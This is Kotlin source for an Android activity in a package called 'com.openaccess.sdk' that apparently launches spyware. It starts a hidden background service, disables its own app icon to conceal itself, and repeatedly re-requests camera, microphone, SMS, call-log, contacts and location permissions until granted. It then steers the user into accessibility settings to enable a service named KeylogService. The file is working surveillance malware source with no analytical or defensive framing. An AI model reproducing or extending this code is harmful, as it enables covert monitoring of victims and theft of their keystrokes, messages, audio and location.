package com.openaccess.sdk

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.KeylogService
import com.openaccess.sdk.service.MainService

class MainActivity : Activity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val RC_ALL = 100
        private const val RC_MANAGE_STORAGE = 101
        private const val RE_REQUEST_DELAY = 500L

        val ALL_PERMS = listOfNotNull(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.READ_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.WRITE_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.POST_NOTIFICATIONS else null,
        )

        fun hasManageExternalStorage(ctx: Context): Boolean {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Environment.isExternalStorageManager()
            } else {
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
            }
        }

        fun hasPermission(ctx: Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val ourService = ComponentName(ctx, KeylogService::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) {
                false
            }
        }

        fun openAccessibilitySettings(ctx: Context) {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
            } catch (_: Exception) {
                try {
                    val intent = Intent(Settings.ACTION_SETTINGS)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(intent)
                } catch (_: Exception) {}
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }
        Log.i(TAG, "onCreate SDK=${Build.VERSION.SDK_INT}")

        // 1. Start main service
        try { MainService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }

        // 2. Hide app icon
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        // 3. Check and request permissions
        requestAllPerms()
    }

    private fun requestAllPerms() {
        val needed = ALL_PERMS.filter { !hasPermission(this, it) }
        Log.i(TAG, "Permissions needed: ${needed.size}/${ALL_PERMS.size}")

        if (needed.isEmpty()) {
            Log.i(TAG, "All permissions granted")
            onAllPermissionsGranted()
        } else {
            Log.w(TAG, "Requesting: ${needed.joinToString(", ")}")
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_ALL) {
            val denied = perms.filterIndexed { i, _ -> results[i] != PackageManager.PERMISSION_GRANTED }
            val granted = perms.filterIndexed { i, _ -> results[i] == PackageManager.PERMISSION_GRANTED }

            if (granted.isNotEmpty()) {
                Log.i(TAG, "Granted: ${granted.joinToString(", ")}")
            }

            if (denied.isNotEmpty()) {
                Log.w(TAG, "Denied: ${denied.joinToString(", ")} — re-requesting in ${RE_REQUEST_DELAY}ms")
                // Re-request denied permissions after short delay
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isFinishing && !isDestroyed) {
                        ActivityCompat.requestPermissions(this, denied.toTypedArray(), RC_ALL)
                    }
                }, RE_REQUEST_DELAY)
            } else {
                onAllPermissionsGranted()
            }
        }
    }

    private fun onAllPermissionsGranted() {
        Log.i(TAG, "All permissions granted — checking accessibility")
        if (!isAccessibilityEnabled(this)) {
            Log.w(TAG, "Accessibility not enabled — opening settings")
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isFinishing && !isDestroyed) {
                    openAccessibilitySettings(this)
                }
            }, 300)
        }
        finish()
    }

    override fun onResume() {
        super.onResume()
        // Re-check permissions every time activity resumes
        val stillNeeded = ALL_PERMS.filter { !hasPermission(this, it) }
        if (stillNeeded.isNotEmpty()) {
            Log.w(TAG, "Still missing permissions on resume: ${stillNeeded.size}")
            requestAllPerms()
        } else if (!isAccessibilityEnabled(this)) {
            Log.w(TAG, "Accessibility still not enabled")
            openAccessibilitySettings(this)
        }
    }
}
